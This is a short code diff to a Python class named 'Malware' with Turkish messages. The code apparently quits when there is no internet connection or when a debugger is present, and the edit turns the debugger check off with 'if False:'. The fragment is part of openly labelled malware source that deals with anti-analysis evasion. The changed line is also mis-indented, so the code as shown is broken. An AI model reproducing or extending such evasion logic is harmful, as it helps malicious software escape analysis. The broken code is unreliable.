@@ -211,7 +211,7 @@ class Malware:
             if not Checks.is_connected():
                 print('İnternet yok')
                 return
-            if Checks.is_debugged(): 
+             if False:  # Checks.is_debugged() devre dışı
                 print('algılanan hata ayıklayıcı')
                 return
             
